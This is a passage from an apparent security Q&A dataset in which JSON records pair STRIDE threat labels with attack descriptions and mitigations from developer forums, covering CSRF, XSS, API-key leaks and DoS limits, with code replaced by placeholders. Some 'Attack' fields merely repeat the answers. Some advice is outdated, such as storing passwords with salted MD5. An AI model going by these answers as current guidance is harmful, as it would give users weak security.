    "Attack": " I want to include the capability to stop DDOS attacks from a certain IP (or pool of IPs). This as to be at the nginx level, rather than any deeper in the code. Do I need a web application firewall? If so, how do I integrate it. ",
    "Mitigation": " If you want to prevent certain IPs or even subnets from accesing your app, add the following code to your [CODE] block:  [CODE]  Also if you're not useing REST, then you might want to limit possible HTTP verbs, by adding the following to your [CODE] block:  [CODE]  To lessen the possibility of DoS attack, you might want to limit the number of possible requests from single host (see [LINK]), by adding the following to NGINX [CODE]:  [CODE]  and the following to your [CODE] block:  [CODE]  Some other useful setting for [CODE], that help mitigate DoS if set correctly:  [CODE]  Since it's too broad to explain these all here, suggest you to look in the docs [LINK] for details. Though choosing correct values is achieved via trial and error on particular setup.  Django serves error pages itself as templates, so you should remove:  [CODE]  Adding [CODE] to [CODE] if you don't really care for logging is also an option:  [CODE]  this will lower the frequency of filesystem requests, therefore increasing performance.  NGINX is a great web server and setting it is a broad topic, so it's best to eaither read the docs (at least HOW-TO section) or find an article that describes the setup for a situation close to yours. "
  },
  {
    "Threat": "S",
    "Attack": " Some sources says that the web browser generates the session key. Now if the web browser generates it then its vulnerable for replay attacks.  ",
    "Mitigation": " Both the client and the server generate a Nonce which is used along with other data to generate the \"Pre-Master Secret\".  Even after the connection has closed a session can be resumed and the same \"Master Secret\" is used.  All of this is covered in [LINK].   "
  },
  {
    "Threat": "I",
    "Attack": " A company is developing software that it hosts for the public that relies on OAuth2 to some 3rd party for authentication. But unavoidably the OAuth secret for this application will be exposed to all employes of the company. Presumably, some bad employee could use it for nefarious purposes or share it with someone else who would. ",
    "Mitigation": " Authorization code grant is more secure than implicit even in case the client secret can leak. Such scenario is the same as using authorization code grant with a public, instead of a confidential, client.The only benefit of the implicit grant is simplicity and performance improvement (avoiding a back-channel call between client and authorization server).Implicit grant has at least these weaknesses which are not present in the authorization grant:the access token is transmitted in URI fragment which can expose it to unauthorized parties (e.g. in browser cache, referrer parameters, logs)in implicit grant resource owner has access to the access tokenIn case the secret gets leaked in authorization grant, a potential attacker will be able to:request tokens on behalf of the client (and potentially impersonate the client e.g. by DNS manipulation), but the same applies to the implicit grantin case attacker would be able to obtain refresh tokens (by compromising the client) he would be able to re-use them (which can be mitigated by not storing refresh tokens)In any case you should make sure that the authorization server registers URL of your client and validates that the redirect_uri provided during authorization code flow is valid for the client. You have to use SSL/TLS for transfer of the authorization code to the client and exchange of the authorization code for the access token.You can find more discussion on this subject in the OAuth 2.0 threat model document ([LINK]) "
  },
  {
    "Threat": "S",
    "Attack": " I am currently working on a project which uses Blogger API from Google. Day before yesterday (saturday) someone attacked my application and grab the API Key, My daily limit for accessing posts is 100,000 (100K/24 hrs). I hit limit on Saturday (I suspect that those were fraudulent clicks made using my API key, since I've only around 4K customers using the application, I embedded the API key in client side code). ",
    "Mitigation": " The Google API console lets you bind your API key to a set of signing certificates of the app.If you limit the API key to a few certificates, the API should be useless to an attacker.(As long as you keep your private key secret.) "
  },
  {
    "Threat": "T",
    "Attack": " It can also give you a fighting chance against SQL injection attacks. ",
    "Mitigation": " A middle tier is usually introduced between the client and the database to check security, validate and bind inputs, and shuttle requests to the appropriate handler for fulfillment.  Have users present credentials that your middle tier has to validate before passing them along to the database. "
  },
  {
    "Threat": "T",
    "Attack": " I feel I am doing what I can to prevent attacks from the Form side, but not from the database side. I know you can change the type of password storage to encrypt upon entry to the database, but what I don't understand is how I would then query this encrypted string. ",
    "Mitigation": " First of all, don't store plain text passwords in your database. So, when registering a new user insert their password as a [LINK]. MD5 is most commonly used for this. I suggest using a salt with this. So for storing:   [CODE]  Now when the user wants to login, you have their password again in your post. Now make the same hash as before and search for this hash in the database (with their username). This way you don't store their actual passwords. "
  },
  {
    "Threat": "E",
    "Attack": " Now adding a 3rd participant to this communication will not work because key exchange algorithms are designed to derive a shared secret from 2 public keys only (especially using .NET and BouncyCastle). So the question is, how would you go about implementing a n-party public key cryptography schema which is still authentic (i.e. resistant to man in the middle attack) and secure (i.e. secure from eavesdropping). ",
    "Mitigation": " It seems to me that a \"Multi-Party Key Agreement Scheme\" is also possible but currently there doesn't seem to much practical implementations using .net/c#. Very neat academic (but very hard to implement) idea here from Giuseppe Atenies (IEEE): [LINK].  I've also came across a very neat article at CodeProject about 3-tier Diffie Hellman which can possibly be extended to n-party, as in my case: [LINK] "
  },
  {
    "Threat": "E",
    "Attack": " The big one - people stealing the API key via man-in-the-middle attack.Highscore injection, false achievement unlocks.Decompiling the SWF and stealing the API key.Using the API key to create a dummy flash application and send random data like highscores.Altering the API itself so you don't need to be logged in, etc. ",
    "Mitigation": " Against man-in-the-middle HTTPS seems the only option. It may have its vulnerabilities, but it's way better than any home-made solution. The problem that you'll need actual certificate from authorized center, because ActiveX-based Flash plugin will not trust self-signed certificate.Should not be possible without decompilationSecureSWF with reasonably high settings (code execution path obfuscation and encrypted strings) should beat most decompilers. Sure, SWF can be examined with hex editor, but this will require very determined hacker.Should not be possible without decompilationAPI should be on server and any API function would require user context (loaded by HTTPS)  Also add encryption to flash shared objects\\cookies. I had successfully altered some savegames using simple hex editor, because they were just objects in AMF format. Encryption will depend on SWF decompilation, but since we are using SecureSWF... Or move savegames on server. "
  },
  {
    "Threat": "S",
    "Attack": " The security concern I have is that someone will copy the embed code from one site and put it on another. Each page/site combination that implements my script/iframe is going to have a unique ID that the site's developers will generate from an authenticated account on my site.  I then supply them with the appropriate embed code.  I read [LINK] which was very helpful, but my use case is a bit different since I'm actually going to pop up content for users to interact with.  The concern is that an enemy of the site hosting my embed will deceptively lure their own users to use the widget. These users will believe they are interacting with my site on behalf of the enemy site but actually be interacting on behalf of the friendly site. ",
    "Mitigation": " The two solutions that come to mind for this are as follows, the first being a compromise but simple and the second being a bit more involved (for both you and users of your widget).  Referer Check  You could validate the [LINK] to check that the domain matches the one expected for the particular Site ID, but keep in mind that not all browsers will send this (and most will not if the referring page is HTTPS) and that some browser privacy plugins can be configured to withhold it, in which case your widget would not work or you would need an extra, clunky, step in the user experience.  Website [CODE] embeds your widget using  say an embedded script [CODE]Your widget uses server side code to generate the .js file dynamically (e.g. the request for the .js file could follow a rewrite rule on your server to map to a PHP / ASPX).The server side code checks the [CODE] HTTP header to see if it matches the expected value in your database.On match the widget runs as normal.On mismatch, or if the referer is blank/missing, the widget will still run, but there will be an extra step that asks the user to confirm that they have accessed the widget from [CODE]In order for the confirmation to be safe from [LINK], you must [LINK]. "
  },
  {
    "Threat": "E",
    "Attack": " It's the most obvious solution, but if the database is compromised somehow, then all of the secrets will have to be changed. To me this solution is not ideal because it has all of the problems of storing a password in plain-text.  This will provide some security, because if the database is compromised then the secrets will still be safe. But reversible encryption requires an encryption key, and the key has to be stored on the server. It means that if an attacker compromises the machine, then the encryption can be circumvented. ",
    "Mitigation": " Take a look at [LINK]. I'm not an expert on the topic, but I think you're missing part of the equation. In addition to the consumer key and secret, you'll be verifying the application that's sending the request (using an x509 certificate if you're using RSA-SHA1). "
  },
  {
    "Threat": "T",
    "Attack": " If the API is implemented in a web service presented through a browser, the attack vector is quite real.  On the other hand, if the API is implemented in a desktop app, or a mobile application - XSS escaping would be a total nuisance and not needed. ",
    "Mitigation": " No you shouldn't - the XSS processing should be done by whatever is actually going to show the data. Many 3rd party ASP.NET controls already implement XSS protection on the text they display, so you could end up with a situation where the text is double-encoded. "
  },
  {
    "Threat": "E",
    "Attack": " I want to write a function that allows users to match data based on a regexp, but I am concerned about sanitation of the user strings. I know with SQL queries you can use bind variables to avoid SQL injection attacks, but I am not sure if there's such a mechanism for regexps. I see that there's [LINK], but I want to allow valid regexps. ",
    "Mitigation": " As a strategy that's more efficient, you might want to sanitize the list of tags into a combined regexp you can run once. It is generally far less efficient to construct and test against N regular expressions than 1 with N parts.  Perhaps something along the lines of this:  [CODE]  This can be used like this:  [CODE]  If the exit call was executed, the program would halt there, but it just interprets that as a literal string. To avoid warnings it is escaped with backslashes. "
  },
  {
    "Threat": "E",
    "Attack": " Today, our Enterprise Architect mentioned that a recent vulnerability was discovered in the JRE 1.7.  I found an article the [LINK].   The details of the latest vulnerability have not been made public.  However, my understanding is that it only affects Java browser plugins.  The recommended mitigation is to disable the Java browser plugins.  No mention is made of non-plugin Java, so I think it is safe to assume that your dev machine is not vulnerable simply by virtue of having Java 7 installed. ",
    "Mitigation": " The details of the latest vulnerability have not been made public.  However, my understanding is that it only affects Java browser plugins.  The recommended mitigation is to disable the Java browser plugins.  No mention is made of non-plugin Java, so I think it is safe to assume that your dev machine is not vulnerable simply by virtue of having Java 7 installed. "
  },
  {
    "Threat": "S",
    "Attack": " The AntiForgeryToken is used to prevent CSRF attacks, however the links on MSDN don't give me much insight to what exactly the AntiForgeryToken does, or how it works, or why things are done the way they are. ",
    "Mitigation": " 1)  Internally, mvc uses RNG crypto methods to create a 128 bit string to act as the XSRF token.  This string is stored in a cookie as well as in a hidden field somewhere on the form. The cookie name seems to be in the form of __RequestVerificationToken + a base 64 encoded version of the application path(server side).  The html part of this uses the AntiForgeryDataSerializer to serialize the following pieces of data   - salt   - value(the token string)   - the ticks of the creation date   - the username (seems like Context.User)  The validate method basically deserializes the values out of the cookie and that of the form and compares them based on the values (salt/value/ticks/username). "
  },
  {
    "Threat": "E",
    "Attack": " Can user access current state of my program or table etc someshow?Can user have access to os level calls?Can user halt my system by looping or using much memory e.g. by doing range(10*8), in some cases he can e.g 100**1000 etc so 3 is not so much of a problem. i may check such op with tokenize and anyway I will be using GAE so it is not not much of concern.  It's completely unsafe to use [CODE], even with built-ins emptied and blocked -- the attacker can start with a literal, get its [CODE], etc, etc, up to [CODE], its [CODE], and so forth... basically, Python introspection is just too strong to stand up to a skilled, determined attacker. ",
    "Mitigation": " [LINK] is safe, if you can live by its limitations... "
  },
  {
    "Threat": "I",
    "Attack": " Second: even if I did make this form and api call from inside the controller where the user can't see it, anyone with access to the source code (like the web host, or other developers) would be able to see the password. This doesn't seem like good security. What's the practice here? How can this be made secure? ",
    "Mitigation": " About your second concern, you can have those parameters that are sensitive encripted in a web.config, and that way only on runtime you have those parameters readable.  PayPal also provides a Sandbox, for you to test your integration... so at that moment you could have this values without encripting. Once you move your app to production, replace the test parameters with your encripted production credentials. "
  },
  {
    "Threat": "T",
    "Attack": " \"A potentially dangerous Request.Form value was detected from the client may it be a XSS attempt or a malicious character ",
    "Mitigation": " It's not MVC-specific. ASP.Net webforms will give you the same error.    I think you should use Custom Error Pages. Custom error pages are defined in Web.config like:    [CODE]  For more information about custom error pages, visit [LINK]    Also, you can handle Global.asax Application_Error event to do whatever you want.  Microsoft has a very nice article including source code which does exactly what you want to do (and more). check it out at [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " Note: I take care of SQL injection and output escaping elsewhere - this question is about input filtering only, thanks. ",
    "Mitigation": " There are many different approaches to XSS that are secure.  The only why to know if your approach holds water is to test though exploitation. I recommend using a [LINK]*,  or the open source [LINK].   To be honest I'll never use strip_tags() becuase you don't always need html tags to execute javascript! I like [CODE] .  For instance this is vulnerable to xss:  [CODE]  You don't need &lt;>  to execute javascript in this case because you can use onmouseover,  here is an example attack:  [CODE]  The ENT_QUOTES will take care of the double quotes which will patch this XSS vulnerability.   *I am affiliated with this site/service. "
  },
  {
    "Threat": "I",
    "Attack": " So I believe this achieves the strong server side password requirement. However I also need to protect as best I can against compromised client devices after the signup process (devices compromised before/during the signup process are a lost cause). Obviously with a 4 digit encryption key, there are only 10,000 possible combinations, so an attacker will easily be able to try every combination on the locally encrypted strong password very quickly. What I want to know is do I have to choose a specific symmetric encryption scheme and/or generated password format so that the attacker will not be able to tell from local data alone which of the 10k decryption attempts was the correct one? i.e. He would still have to attempt each of the 10k passwords on the server-side login. ",
    "Mitigation": " You could store a salt in the local device and calculate key1 using PBKDF2. Then use that key server side to calculate key2, using a separately stored salt. As key1 is never stored, the attacker does not have the required information. "
  },
  {
    "Threat": "I",
    "Attack": " Still, can the data that is being worked with there be accessed somehow (other than cracking my account and downloading them :)), since obviously opening such files in browser will not give any results to the attacker?  ",
    "Mitigation": " The best approach however is to store the applications code outside of the webroot, so that those files are never accessible by a direct HTTP request. "
  },
  {
    "Threat": "E",
    "Attack": " This will log the current user out of his/her session. Since this is a simple GET request, a malicious user could either create links to this page or even put this link in an image's [CODE] attribute that would force users to get logged out. I would still like to maintain the simplicity of the logout link without having to go too far, but at the same time I would like to be able to prevent the above scenario from occurring.  ",
    "Mitigation": " Well, there are a few options that you can do to help secure against CSRF attacks:  Use a form and a random token.  So instead of having a \"link\", use a random token that's set in the session into a form  [CODE]  Note that POST is best for this type of action, but you could change the form to a GET without too much trouble.   Then in php, just do:  [CODE]  Note that [CODE] should work something like this:  [CODE]  Also note that whenever you fetch the token to check it, you should reset it to something new (which is what this does).  This prevents replay attacks where an attacker detects the token on submission and resubmits the value.If you must use a link, then embed the token in the link.  But note that this is more susceptible to attack since there's a chance the user might copy and paste the link to someone else.  As long as it's a self-resetting token, there shouldn't be much issue with multiple tabs.  But realize that it's not optimum:  [CODE]  It's absolutely better than nothing.  But I would still suggest using the form for the best protection.  I would highly suggest reading and following the [LINK] for preventing CSRF.  It will tell you just about all you need to know, and why... "
  },
  {
    "Threat": "S",
    "Attack": " Yes, it is sufficient to prevent Cross Site Request Forgery.   The browser will make a request to mysite.com, and it will also send along the cookie with the session id. The thing to understand here is that evilsite.com cannot read the cookie, but it can still get its job done.  Browser same-origin policy prevents evilsite.com from reading the session identifier whether its in the cookie or embedded in html page. But because browser automatically sends the cookie to your server even if the resource was requested from the html code in another domain, you have XSRF.  ",
    "Mitigation": " To prevent this, it is recommended to put the session identifier as a request parameter. If its added as a request parameter, evilsite.com cannot access the identifier, and hence cannot put it in the img src attribute.  "
  },
  {
    "Threat": "T",
    "Attack": " I am working on a ASP.Net C# + jQuery ajax website project.  I am trying to prevent xss attacks and I know below  is not the full approach, but this is at the least what I should do - to use HtmlEncode when accepting free string input from users).  And I really someone to kindly check if I am doing the right thing.  You need to keep in mind the content type of each string you deal with and where it came from - whether from a safe source or an untrusted source, and also know when concatenating two strings that both are strings of the same content-type and trust-level.I wrapped up the &quot;Description&quot; text using [CODE], so the string will be interpreted as pure text before going into database i.e. [CODE] becomes [CODE].Here it sounds like you're saying the description field is a string of plain text and what you're storing in the database is a string of safe HTML (since [CODE]'s output is guaranteed not to contain dangerous code).This shows the first problem with prematurely encoding content.  If you're composing a SQL string to send to the server, pre-encoding as HTML does not protect you from SQL injection.  Using a SQL prepared statement is a good way to overcome this for SQL, but pre-encoding does not render a string safe in all contexts.The part that follows is what i am in doubt - how to handle the html encoded text before returning it back to the user?When the user wants to view the Description text entered, the website retrieved from database and prints it out.If the user is receiving safe HTML, and you have a string of safe HTML, you can just send that to the user.If the user is receiving a plain text email, then you need to convert the safe HTML stored in the database to plain text.If the user is receiving RSS, then you need to make sure you compose your RSS using substrings of XML.[LINK] can help you make sure values are properly encoded on output. ",
    "Mitigation": " You need to keep in mind the content type of each string you deal with and where it came from - whether from a safe source or an untrusted source, and also know when concatenating two strings that both are strings of the same content-type and trust-level.I wrapped up the &quot;Description&quot; text using [CODE], so the string will be interpreted as pure text before going into database i.e. [CODE] becomes [CODE].Here it sounds like you're saying the description field is a string of plain text and what you're storing in the database is a string of safe HTML (since [CODE]'s output is guaranteed not to contain dangerous code).This shows the first problem with prematurely encoding content.  If you're composing a SQL string to send to the server, pre-encoding as HTML does not protect you from SQL injection.  Using a SQL prepared statement is a good way to overcome this for SQL, but pre-encoding does not render a string safe in all contexts.The part that follows is what i am in doubt - how to handle the html encoded text before returning it back to the user?When the user wants to view the Description text entered, the website retrieved from database and prints it out.If the user is receiving safe HTML, and you have a string of safe HTML, you can just send that to the user.If the user is receiving a plain text email, then you need to convert the safe HTML stored in the database to plain text.If the user is receiving RSS, then you need to make sure you compose your RSS using substrings of XML.[LINK] can help you make sure values are properly encoded on output. "
  },
  {
    "Threat": "I",
    "Attack": " Regardless of the programming languageI have a client server application.mobile client - http serverThe app will be available on several mobiles not only android.I want to make sure the request is coming from client's mobile only.How can I solve this security problem?I propose :Have a secret key hard-coded on the mobile app:Each request is encrypted using this key and decrypted on the server side.Is it safe to hardcode the key if this way makes sense at all? (decompilers can get the key? the app will be available not only for android!)Extra info:Each user will have a userid/username... ",
    "Mitigation": " Do not put encryption keys (or anything else that you need to keep secret) into mobile apps and then rely on them. This is a critical flaw.  The key can be reverse engineered, and in fact several big name companies have made this mistake. Google \"twitter oauth key compromised\". "
  },
  {
    "Threat": "S",
    "Attack": " In order to prevent XSRF I force such request to be [CODE] requests. With [CODE] it's trivial to generate a XSRF using the following: ",
    "Mitigation": " No chaning to post does not solve this problem.  You should read [LINK].  Here is an example Proof of Cocnept POST based CSRF exploit that I wrote.  This gives you [LINK]:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " remote access to MySQL is not very secure. When your remote computer first connects to your MySQL database, the password is encrypted before being transmitted over the Internet. But after that, all data is passed as unencrypted \"plain text\". If someone was able to view your connection data (such as a \"hacker\" capturing data from an unencrypted WiFi connection you're using), that person would be able to view part or all of your database.  ",
    "Mitigation": " 1) Connect to [LINK]. This will protect your username/password as well as data that is being transferred.  Another option is to [LINK] which is better suited if you have multiple machines or daemons that need to be shared.   2)Do not Allow remote root logins.  At the very least disable the \"root\" account becuase this is the first thing an attacker is going to try and brute force.  3)[LINK] of the user accounts you are using.  4) Remove [CODE] from all accounts.  If granted this will allow an attacker to read and write files on the server hosting mysql.  "
  },
  {
    "Threat": "I",
    "Attack": " The current process for encrypting the data server-side I plan to use is based on [LINK]. Summarised, it advocates encrypting each separate user's data asymmetrically with their own public key, stored on the server. The private key to decrypt this data is then itself encrypted symmetrically using the user's password, and stored. This way, even if the database is stolen, the user's password hash needs to be broken, and even then the process needs to be repeated for every user's data.  The only weakness, pointed out by the author himself, and the main point of my question, is the fact that while the user is logged in, the decrypted key is stored in session storage. The way the article suggests to deal with it is to just limit the time the user is logged in. I thought a better solution would be to store that key in a short-lived secure cookie (of course the whole process is happening over HTTPS). That way, if the attacker has control of the user's computer and can read their cookies, they can probably just keylog their password and log in, no need to steal the database, while even if the attacker gains access to the server, they cannot decrypt the HTTPS traffic (or can they? I'm not sure.)  My current plan is to write all this data to a JSON file, gzip it and upload it to the server. My question is, how do I do that while ensuring the security of the data? Naturally, the upload will happen over HTTPS, and I have an API password in place to only allow authorised uploads, but my main concern is how to protect the data if the server is compromised. I don't want the attacker to just grab the JSON file from the server while it's being processed. One idea I had was to get the server to send me a list of public keys for the users, and perform the encryption in my software, before the upload. It seems to me like that's the only way of protecting that data. I could encrypt the whole JSON file, perhaps with an API key or a special password, but that's moot if the attacker can just access the decrypted file as it's being processed on the server. Is that a good solution?  As it happens, I am working on a similar system to encrypt personal details (email, IP) in Wordpress comments, so that if the server is compromised, sensitive data in the database is still encrypted. Storing an assymetric decryption key in the session was out for me, since this could leave the key on the server for an attacker to grab at the same time as their compromising it. ",
    "Mitigation": " <h1>Question 1</h1>  <h2>Encryption</h2>  As it happens, I am working on a similar system to encrypt personal details (email, IP) in Wordpress comments, so that if the server is compromised, sensitive data in the database is still encrypted. Storing an assymetric decryption key in the session was out for me, since this could leave the key on the server for an attacker to grab at the same time as their compromising it.  So, cookies over an SSL cert is a better way to go - at least the attacker then has to wait for a user to log in before they can steal their key(s). In tandem with this, some sort of tripwire system would be a good idea, so that users cannot log onto the system (thus providing their keys to the waiting attacker) once it is compromised.  As you say, encrypting records (either with one key as per my design, or many keys as per yours) means that searching through records becomes a process you have to move away from your database server, which in turns means that it will be significantly slower.  You may be able to mitigate against this by making a trade-off between speed and security: some fields can be fuzzied and then stored unencrypted. For example, if you want to search where your patients are located, get their (lat, long) from their address, apply a random shift to it (say up to 3 miles on both axes in either direction) and then store the resulting coordinates in plain text. Approximate count queries relating to location can then be done without decryption.  <h2>Mitigating against attacks on a client computer</h2>  The above looks at how to mitigate against attacks against the server, which is your greatest risk, since you have all your records stored there. As you rightly point out though, attacks on client machines is also a concern, and if they are members of the public then their security processes can be assumed to be non-existent.  On that basis you could strengthen a single password (which is given in its entirety) with a passphrase from which the client needs to select three random letters (i.e. it is specifically not given in its entirety). This defends elegantly against keyloggers in two ways: firstly drop-down menus are used, which are harder to eavesdrop, and even if the user uses keyboard shortcuts, they have not supplied the full phrase. At each successful logon, the index of the random letters (e.g. 1, 4 and 5) is recorded and not asked again for a long period. Obviously, too many wrong answers causes the account to be locked out and require reauthorisation via a phone call or snail-mail reset code.  Other authentication methods you could use: text the user an additional passphrase every time they enter the correct password, or (probably prohibitively expensive) use an authentication device as per online banking.  <h2>Store little/no identifying information</h2>  Another tip for security is to store as little personal information as possible. If you can do without the ability to immediately reset passwords via email, then name, address, telephone numbers and email - all personally identifying data - are perhaps unnecessary. That personal information can be stored separately on a disconnected database on another server, using a common primary key to link them together. (In fact if the user wishes to reset their password, you could simply store a flag against their anonymous user record, and the pharmacist can run the reset process manually on their firewalled machine when they next visit an admin panel).  <h1>Question 2</h1>  Should you encrypt tabular data in one blob or leave it in each column? I've looked at this one as well in my application. For me, I stored it in one blob, since my use-case is search-intensive, and having N decrypts per row rather than one made the decision easy. That said, you may prefer the tidiness of encrypting columns individually, and one could argue that if corruption creeps in, separating them out gives you a better chance that some of the row will survive.  If you decide to store in a single blob, I am using a format similar to this (rows separated with newlines prior to being asymmetrically encrypted):  [CODE]  If you have several processes writing to columns, make sure you lock rows between read and write, otherwise (as hinted above) you can lose some of your data.  As you say, this could equally be JSON, if that format is better for you.  <h1>Question 3</h1>  My understanding of this question is: how do you replicate to an unencrypted offline copy  given that you cannot decrypt user records yourself? I wonder here whether you could relax your security constraints a bit, and store a common public key on the server, and keep a separate record of changes encrypted with the common key. This would populate a table which should periodically be emptied (by running a sync routine on a remote secure machine); thus, the value of the changes table to an attacker will be small compared to obtaining the whole database unencrypted.  The corresponding private key, of course, should be on the pharmacist's computer, again securely fire-walled from the internet.  The risk with this design is that an attacker replaces the server public key with one of his/her own, so that they can later collect information that has effectively been encrypted just for them! However, as long as you've installed a trip-wire on the server, this can be reasonably defended against: if this is triggered, the dynamic part of the web application won't write any new changes (in fact won't work at all) until the system is scanned and determined to be safe. "
  },
  {
    "Threat": "T",
    "Attack": " Update: It actually wasn't my website that got hacked, yet the host. The SSH password was cracked and it installed a new index file in each and every folder. ",
    "Mitigation": " Sanitize and validate all inputs - also cookies, they can be tampered with like everything else that is sent by the client.Keep OS and frameworks up-to-date with latest security patches. If you use a CMS, be sure to be up-to-date with that as well.Never send text submitted by the user back, unless you html encode it first.Use parameterized SQL queries to keep SQL injections attacks away.In general, Code defensively. "
  },
  {
    "Threat": "R",
    "Attack": " 1. What exactly is the security risk with popups?The new browsers provide settings to block window popups (on blocking, sites with active popups display a message to user). What exactly is the security risk with popups? If allowing popups can execute something dangerous, then the main window can too. Is it not the case. I think I don't know about some special powers of window popups.  3. Is it possible to override browser's popup blocking settingsLastly, the HDFC site succcessfully displays popup window even when in the browser settings popups are blocked. So, how do they do it? Is that a browser hack?To see this -      You can verify that even if popups are blocked/popup blocker is enabled in the browser settings, this site is able to display popups.  Popup windows are a notable \"phishing\" technique. Hostile sites can use popups to convince users that an important message from a trusted site has been delivered, and trick those people into clicking through to some malware URL (or perhaps even just the click itself might exploit a bug).  Yes, the main page of the site could do that too, but a well-crafted popup can distract the user and may not be directly associated with the hostile main page.Popups were exploited by many unsavory sites as a way to \"trap\" users and to essentially force ad impressions, etc. In this respect, the security aspect of the problem really is the security of the user's control over their own computer and their browsing desires.  Modern browsers will allow popups when they're launched from an event loop triggered by an explicit user action. Thus, it's perfectly OK (ignoring web design best practices) to open up something like a \"Help\" section for your website in a separate window if that happens when the user clicks a \"Help Me!\" button. Also, it's become quite common for sites to use in-page \"pseudo windows\" to jam content in front of hapless visitors, and browsers really can't do anything to stop that.  No.  That HDFC bank example is a good one. Their popup window comes up only when you click on the \"Login\" button. Because that \"click\" is an explicit user-initiated action (unlike, say, page load), the browser will allow a popup window. That'll be true for any site; the bank doesn't have to do anything special for that to work.  You can generally do popups from \"click\" event handlers, but you cannot launch a popup from something like a state change handler from an XHR.  ",
    "Mitigation": " Modern browsers will allow popups when they're launched from an event loop triggered by an explicit user action. Thus, it's perfectly OK (ignoring web design best practices) to open up something like a \"Help\" section for your website in a separate window if that happens when the user clicks a \"Help Me!\" button. Also, it's become quite common for sites to use in-page \"pseudo windows\" to jam content in front of hapless visitors, and browsers really can't do anything to stop that.  No.  That HDFC bank example is a good one. Their popup window comes up only when you click on the \"Login\" button. Because that \"click\" is an explicit user-initiated action (unlike, say, page load), the browser will allow a popup window. That'll be true for any site; the bank doesn't have to do anything special for that to work.  You can generally do popups from \"click\" event handlers, but you cannot launch a popup from something like a state change handler from an XHR.  "
  },
  {
    "Threat": "T",
    "Attack": " It would be better to store the hash on the server-side. It is conceivable that the attacker can change the value and generate his/her own SHA-1 hash and add the random string (they can easily figure this out from accessing the page repeatedly). If the hash is on the server-side (maybe in some sort of cache), you can recalculate the hash and check it to make sure that the value wasn't tampered with in any way.  I read the question wrong regarding the random string (constant salt). But I guess the original point still stands. The attacker can build up a list of hash values that correspond to the hidden value. ",
    "Mitigation": " It would be better to store the hash on the server-side. It is conceivable that the attacker can change the value and generate his/her own SHA-1 hash and add the random string (they can easily figure this out from accessing the page repeatedly). If the hash is on the server-side (maybe in some sort of cache), you can recalculate the hash and check it to make sure that the value wasn't tampered with in any way. "
  },
  {
    "Threat": "S",
    "Attack": " The reason is to harden the web application against session hijacking (eg by [LINK]) and replay or man-in-the-middle attacks.  ",
    "Mitigation": " The question really comes down to what you want to achieve. If you want to fight CSRF-Attacks, a secret token in addition to the session key is your way to go. However, changing the token in every request will cause problems - not only will the back-button kill the session, but as one webpage usually contains a lot of asynchronously and parallel loaded data (images, css, javascript, etc.), your approach will not enable any additional data to be loaded afterwards, as each additional request will change the required token, thus killing the session.   You may get around this by embedding all resources into the page via BASE64 and other tricks, but that will seriously hinder your possibilities and may have compatibility issues with some browsers.  So, in the end, your approach will not add much security, but will most likely create a whole set of potential problems for your customers. I'd stick to one secret token per session in the URL to fight CSRF and concentrate on securing against other attacks like XSS and user-friendly security measures like two-factor authentication with a smartphone or something similar. After all, the user is the #1 attack vector nowadays.    Update (2012-06-14)  The token will not fight XSS-attacks, but it will defend against basic CSRF-attacks (e.g. by implanting a bogus url call in an image). I've actually had a situation at work today, where I needed to secure a get-request against user modification and [LINK]. The code may be also usable to secure static, session-timeout [CODE]- and [CODE]-tokens (right your problem).  The idea is to have a server-secret, which is used to generate a hash/AuthToken over data to secure. If a rogue javascript would try to change any of the given data, the AuthToken would not match. In my specific problem, I have one server authenticating a user and have to send his information over to a third party (username, mailaddress, name, etc.). This GET-Request might be easily changed by any user after authentication, so I have to authenticate the GET-Request-Parameters. By rerunning the AuthenticationToken-Process, the third party can compare the resulting AuthTokens, thus validating the incoming data. Without the shared secret, it is (near-to) impossible to forge the data.  On your problem: Having a static token on GET and POST-requests (or a dynamic one like the project of mine) will protect you against simple CSRF-attacks via e.g. links in forums, which a user has to click to get attacked. As the link will never contain the correct token, your webpage is secure. However, if an attacker manages to load a javascript into the webpage via XSS, you're screwed and no technique in the world will help against it, as the javascript can scan the whole DOM-tree of the page to find an capture any tokens whatsoever.  So, it comes down to this:  use tokens on GET and POST-requests to fight CSRFsecure your page against XSS-injections "
  },
  {
    "Threat": "S",
    "Attack": " I used new session for each page as defense against both CSRF and automated attacks. Lets say we have forum that uses AJAX to post threads and its validated by PHP SESSION.  Every thing works fine until the user opens page.php?id=456 on another tab, the ajax returns 'invalid request' on ajax.php?id=123 [LINK]. They suggested to use only one session hash all the time, until he/she logs out - only then the session is regenerated. If the token is the same USER could simply bypass it and do the automated attacks. Any ideas on that?   It sounds like your objection to letting the session stay open as long as the browser is open is the issue of automated attacks. Unfortunately, refreshing the token on each page load only deters the most amateur attackers.  This method of changing the token on each page load would do absolutely nothing to stop someone who actually wanted to attack you all that badly. Therefore, since the token has no effect on automation, focus on its effects on CSRF.  From the perspective of blocking CSRF, creating one token and maintaining it until the user closes the browser seems to accomplish all goals. Simple CSRF attacks are defeated, and the user is able to open multiple tabs.  The first token will stay the same until the browser session ends. This token exists to prevent CSRF attacks. Any submission from this user with this token will be accepted.  This way, if I open a tab to Form A and a tab to Form B, each one has my personal anti-CSRF token (CSRF taken care of), and my one-time form token (form resubmission taken care of). Both issues are resolved without any ill effect on the user experience. ",
    "Mitigation": " It sounds like your objection to letting the session stay open as long as the browser is open is the issue of automated attacks. Unfortunately, refreshing the token on each page load only deters the most amateur attackers.  First, I assume we're talking about attacks specifically targeted at your site. (If we're talking about the bots that just roam around and submit various forms, not only would this not stop them, but there are far better and easier ways to do so.) If that's the case, and I'm targeting my site, here's what my bot would do:  Load form page.Read token on form page.Submit automated request with that token.Go to step 1.  (Or, if I investigated your system enough, I'd realize that if I included the \"this is AJAX\" header on each request, I could keep one token forever. Or I'd realize that the token is my session ID, and send my own [CODE] cookie.)  This method of changing the token on each page load would do absolutely nothing to stop someone who actually wanted to attack you all that badly. Therefore, since the token has no effect on automation, focus on its effects on CSRF.  From the perspective of blocking CSRF, creating one token and maintaining it until the user closes the browser seems to accomplish all goals. Simple CSRF attacks are defeated, and the user is able to open multiple tabs.  TL;DR: Refreshing the token once on each request doesn't boost security. Go for usability and do one token per session.    However! If you're extremely concerned about duplicate form submissions, accidental or otherwise, this issue can still easily be resolved. The answer is simple: use two tokens for two different jobs.  The first token will stay the same until the browser session ends. This token exists to prevent CSRF attacks. Any submission from this user with this token will be accepted.  The second token will be uniquely generated for each form loaded, and will be stored in a list in the user's session data of open form tokens. This token is unique and is invalidated once it is used. Submissions from this user with this token will be accepted once and only once.  This way, if I open a tab to Form A and a tab to Form B, each one has my personal anti-CSRF token 